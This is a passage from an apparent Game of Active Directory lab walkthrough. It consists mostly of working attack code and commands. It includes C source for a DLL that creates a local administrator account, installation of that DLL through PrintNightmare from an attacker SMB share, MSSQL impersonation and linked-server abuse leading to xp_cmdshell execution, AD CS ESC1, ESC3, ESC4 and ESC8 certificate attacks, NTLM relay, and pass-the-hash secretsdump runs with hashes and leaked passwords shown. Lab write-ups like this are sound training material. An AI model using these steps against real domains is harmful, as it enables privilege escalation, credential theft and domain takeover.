<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToWindows</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">USER_INFO_1</span><span class="w"> </span><span class="n">ui</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwError</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Initialize user information</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">password</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_PRIV_USER</span><span class="p">;</span><span class="w">  </span><span class="c1">// Standard user (not admin by default)</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_home_dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_comment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UF_SCRIPT</span><span class="p">;</span><span class="w"> </span><span class="c1">// Default user settings</span>
<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_script_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Add user</span>
<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetUserAdd</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ui</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">dwError</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToGroup</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">LOCALGROUP_MEMBERS_INFO_3</span><span class="w"> </span><span class="n">lgmi</span><span class="p">;</span>
<span class="w">    </span><span class="n">lgmi</span><span class="p">.</span><span class="n">lgrmi3_domainandname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Add user to the specified group</span>
<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetLocalGroupAddMembers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lgmi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added to group '%s' successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user to group '%s'. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">doSomeAction</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"jack"</span><span class="p">;</span><span class="w">  </span><span class="c1">// Change this to the desired username</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"password"</span><span class="p">;</span><span class="w"> </span><span class="c1">// Change to a secure password</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrators"</span><span class="p">;</span><span class="w">   </span><span class="c1">// Add user to Administrators group</span>

<span class="w">    </span><span class="c1">// Add the user</span>
<span class="w">    </span><span class="n">AddUserToWindows</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Add user to the "Administrators" group</span>
<span class="w">    </span><span class="n">AddUserToGroup</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
<span class="w">        </span><span class="n">doSomeAction</span><span class="p">();</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>Compile the DLL:</p>
<div class="highlight"><pre><span></span><code>x86_64-w64-mingw32-gcc<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>test.dll<span class="w"> </span>exploit.c<span class="w"> </span>-lnetapi32
</code></pre></div>
<p>Start a SMB server with Impacket's <code>smbserver</code> and use <code>PrintNightmare</code> to remotely install the DLL:</p>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>-smb2support<span class="w"> </span>myshare<span class="w"> </span>./

python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-dll<span class="w"> </span><span class="s1">'\\10.1.0.4\myshare\test.dll'</span><span class="w"> </span><span class="s1">'khal.drogo:horse@meereen.essos.local'</span>
</code></pre></div>
<p><img alt="essos-printnightmare-exploit.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-exploit.png"/></p>
<p><img alt="essos-printnightmare-smbserver.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-smbserver.png"/></p>
<p>Check installed DLLs:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-list<span class="w"> </span><span class="s1">'khal.drogo:horse@meereen.essos.local'</span>
</code></pre></div>
<p><img alt="essos-printnightmare-list-drivers.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-list-drivers.png"/></p>
<p>Check if the attack was successful:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jack'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-x<span class="w"> </span>whoami
</code></pre></div>
<p><img alt="essos-printnightmare-user-created.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-user-created.png"/></p>
<p>Cleanup drivers:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-delete<span class="w"> </span>-name<span class="w"> </span><span class="s1">'Microsoft XPS Document Writer v5'</span><span class="w"> </span><span class="s1">'jack:password@meereen.essos.local'</span>
python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-list<span class="w"> </span><span class="s1">'jack:password@meereen.essos.local'</span>
</code></pre></div>
<p><img alt="essos-printnightmare-cleanup-driver.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-cleanup-driver.png"/></p>
<p>Cleanup user:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jack'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">'net user jack /delete'</span>
</code></pre></div>
<p><img alt="essos-printnightmare-cleanup-user.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-cleanup-user.png"/></p>
<h2 id="mssql-abuse_1">MSSQL Abuse</h2>
<p>Connect to <code>CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL</code> with Impacket's <code>mssqlclient</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local<span class="w"> </span>-windows-auth
</code></pre></div>
<p>Check current user privileges:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_logins</span>
</code></pre></div>
<p><img alt="north_mssql_enum_logins_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_logins_samwell.tarly.png"/></p>
<p><code>samwel.tarly</code> <strong>cannot enable command execution</strong> with <code>xp_cmdshell</code> since it has not enough privileges:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
</code></pre></div>
<p><img alt="north_mssql_enable_xp_cmdshell_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enable_xp_cmdshell_samwell.tarly.png"/></p>
<h3 id="abuse-impersonate-privileges-as-login">Abuse impersonate privileges: as Login</h3>
<p>Check current user impersonate privileges:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_impersonate</span>
</code></pre></div>
<p><img alt="north_mssql_enum_impersonate_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_impersonate_samwell.tarly.png"/></p>
<p><code>samwell.tarly</code> can impersonate as login the system administrator user <code>sa</code>;  impersonate <code>sa</code> login and enable <code>xp_cmdshell</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">exec_as_login sa</span>
<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
</code></pre></div>
<p><img alt="north_mssql_exec_as_login_sa_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_exec_as_login_sa_samwell.tarly.png"/></p>
<p>Execute commands on <code>CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname"</span>
</code></pre></div>
<p><img alt="north_mssql_command_execution_as_sa_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_command_execution_as_sa_samwell.tarly.png"/></p>
<h3 id="abuse-impersonate-privileges-as-user">Abuse impersonate privileges: as user</h3>
<p>With previous <code>sa</code> impersonation (or try all available user and perform enumeration with each one), enumerate again impersonate privileges:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_impersonate</span>
</code></pre></div>
<p><img alt="north_mssql_enum_impersonate_sa.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_impersonate_sa.png"/></p>
<p>User <code>NORTH\arya.stark</code> has impersonate privileges as <code>dbo</code> user on <code>master</code> and <code>msdb</code>. <code>dbo</code> should have <code>xp_cmdshell</code> privileges. </p>
<p>Login with <code>arya.stark</code> credentials and enumerate databases where current user is trusted:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_db</span>
</code></pre></div>
<p><img alt="north_mssql_enum_db_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_db_arya.stark.png"/></p>
<p>Use <code>msdb</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; use msdb
</code></pre></div>
<p>Impersonate as user <code>dbo</code>, enable <code>xp_cmdshell</code> and run shell command</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">exec_as_user dbo</span>
<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
<span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname" </span>
</code></pre></div>
<p><img alt="north_mssql_exec_as_user_dbo_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_exec_as_user_dbo_arya.stark.png"/></p>
<h3 id="abuse-links-trusts">Abuse links trusts</h3>
<p>Enumerate links:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_links</span>
</code></pre></div>
<p><img alt="north_mssql_enum_links_as_sa_dbo_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_links_as_sa_dbo_arya.stark.png"/></p>
<p>A link exists with <code>BRAVOOS</code> and the login <code>NORTH\jon.snow</code> can log as <code>sa</code> to the remote server; login as <code>jon.snow</code> (or impersonate as login) and use the link to connect to the remote database. Being logged as <code>sa</code> to the remote SQL server, it would be possible to execute shell commands:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">use_link BRAAVOS</span>
<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
<span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname" </span>
</code></pre></div>
<p><img alt="north_mssql_use_link_BRAAVOS_jon.snow.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_use_link_BRAAVOS_jon.snow.png"/></p>
<h3 id="mssql-relay">MSSQL Relay</h3>
<p>From the mssql client, run <code>xp_dirtree</code> with SMB protocol:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">xp_dirtree \\10.1.0.4\notexists</span>
</code></pre></div>
<p><img alt="north_BRAAVOS_mssql_relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_BRAAVOS_mssql_relay.png"/></p>
<h2 id="ad-cs_1">AD CS</h2>
<p>Enumerate all vulnerable certificate templates on <code>essos.local</code> with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-json<span class="w"> </span>-vulnerable
</code></pre></div>
<h3 id="esc1">ESC1</h3>
<p>The template <code>ESC1</code> is found to be vulnerable to <strong>ESC1</strong> abuse.</p>
<p><img alt="esoss-esc1-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc1-vuln-cert.png"/></p>
<p>Request a certificate specifying <code>Administrator</code> as altname:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC1<span class="w"> </span>-upn<span class="w"> </span>administrator@essos.local
</code></pre></div>
<p><img alt="essos-esc1-req.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-req.png"/></p>
<p>Obtain TGT and NTLM hash for <code>Administrator</code> using the certificate:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
</code></pre></div>
<p><img alt="essos-esc1-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-auth.png"/></p>
<p>Dump secrets passing the obtained hash on <code>braavos.essos.local</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>essos.local/administrator@braavos.essos.local
</code></pre></div>
<p><img alt="essos-esc1-pth-braavos.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-pth-braavos.png"/></p>
<p><code>sql_svc</code> password is leaked: <code>YouWillNotKerboroast1ngMeeeeee</code>.</p>
<p>Dump secrets passing the obtained hash on <code>meereen.essos.local</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>administrator@essos.local
</code></pre></div>
<p><img alt="essos-esc1-pth-meeren.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-pth-meeren.png"/></p>
<h3 id="esc2-esc3">ESC2 + ESC3</h3>
<p>Templates <code>ESC3-CRA</code> and <code>ESC3</code> are found to be vulnerable to <strong>ESC3</strong> abuse.</p>
<p><img alt="esoss-esc3-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-vuln-cert.png"/></p>
<p><img alt="esoss-esc3-vuln-cert2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-vuln-cert2.png"/></p>
<p>Request a certificate to the enrolling agent:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3-CRA
</code></pre></div>
<p><img alt="esoss-esc3-req1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-req1.png"/></p>
<p>Request a certificate on behalf of <code>Administrator</code> using the enrolling agent provided certificate:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3<span class="w"> </span>-on-behalf-of<span class="w"> </span><span class="s1">'essos\Administrator'</span><span class="w"> </span>-pfx<span class="w"> </span>khal.drogo.pfx
</code></pre></div>
<p><img alt="esoss-esc3-req2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-req2.png"/></p>
<p>Authenticate as <code>Administrator</code> to the DC:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
</code></pre></div>
<p><img alt="esoss-esc3-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-auth.png"/></p>
<p>Template <code>ESC2</code> is also suitable for <strong>ESC3</strong> abuse since has the <strong>Enrollment Agent</strong> setting set to true.</p>
<p><img alt="esoss-esc2-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc2-vuln-cert.png"/></p>
<h3 id="esc4">ESC4</h3>
<p>The template <code>ESC4</code> is found to be vulnerable to <strong>ESC4</strong> abuse.</p>
<p><img alt="esoss-esc4-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-vuln-cert.png"/></p>
<p>Abuse <code>khal.drogo</code> overly permissive rights on the certificate template making it vulnerable to <strong>ESC1</strong>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w">&nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-save-old
</code></pre></div>
<p><img alt="esoss-esc4-edit-template.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-edit-template.png"/></p>
<p>Recheck the template:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-stdout<span class="w"> </span>-vulnerable
</code></pre></div>
<p><img alt="esoss-esc4-result.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-result.png"/></p>
<p>Restore the template to its original configuration:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> &nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-configuration<span class="w"> </span>ESC4.json
</code></pre></div>
<p><img alt="esoss-esc4-restore-template.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-restore-template.png"/></p>
<h3 id="esc6">ESC6</h3>
<p><code>ESSOS-CA</code> seems to be vulnerable to <strong>ESC6</strong>.</p>
<p><img alt="esoss-esc6-vuln-ca.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc6-vuln-ca.png"/></p>
<p>Even though the flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> appears to be set, the server seems to be patched agaist this attack.</p>
<h3 id="esc8">ESC8</h3>
<p><code>ESSOS-CA</code> seems to be vulnerable to <strong>ESC8</strong>.</p>
<p><img alt="esoss-esc8-vuln-ca.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-vuln-ca.png"/></p>
<p>Force <code>MEEREEN.essos.local</code> to authenticate against the attacker machine:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-d<span class="w"> </span>essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-t<span class="w"> </span>essos.local<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.1.0.4
</code></pre></div>
<p>Relay received credentials to the AD CS server to request a new certificate with template <code>DomainController</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>relay<span class="w"> </span>-target<span class="w"> </span><span class="s1">'http://braavos.essos.local'</span><span class="w"> </span>-template<span class="w"> </span>DomainController
</code></pre></div>
<p><img alt="esoss-esc8-coerce-ntlm-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-coerce-ntlm-relay.png"/></p>
<p>Pass the obtained hashes attack to dump credentials:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:2ed16485d41a887f04791d626e77efef<span class="w"> </span><span class="s1">'ESSOS/MEEREEN$'</span>@essos.local
</code></pre></div>
<p><img alt="esoss-esc8-pth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-pth.png"/></p>
<p>The same result can be achieved with Impacket's <code>ntlmrelayx</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span><span class="s1">'http://braavos.essos.local/certsrv/certfnsh.asp'</span><span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>DomainController<span class="w"> </span>-l<span class="w"> </span>dumps
</code></pre></div>
<p><img alt="esoss-esc8-ntlmrelayx.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-ntlmrelayx.png"/></p>
<h3 id="shadow-credentials">Shadow Credentials</h3>
<h5 id="user-account">User Account</h5>
<p><code>khal.drogo</code> has <code>GenericAll</code> rights on <code>viserys.targaryen</code>:</p>
<p><img alt="essos-shadow-credential-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-enum.png"/></p>
<p>Perform a Shadow Credential attack abusing these privileges:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-account<span class="w"> </span>viserys.targaryen
</code></pre></div>
<p><img alt="essos-shadow-credential-exploit.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-exploit.png"/></p>
<p>Use obtained ticket to perform some other operations:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>viserys.targaryen.ccache
impacket-GetADUsers<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>essos.local/viserys.targaryen<span class="w"> </span>-all
</code></pre></div>
<p><img alt="essos-shadow-credential-ptt.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-ptt.png"/></p>
<h5 id="computer-account">Computer Account</h5>
<p>Since a computer object can set the <code>msDS-KeyCredentialLink</code> for itself if it's not already set, perform a Shadow Credential relay attack:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-d<span class="w"> </span>essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-t<span class="w"> </span>braavos.essos.local<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.1.0.4
</code></pre></div>
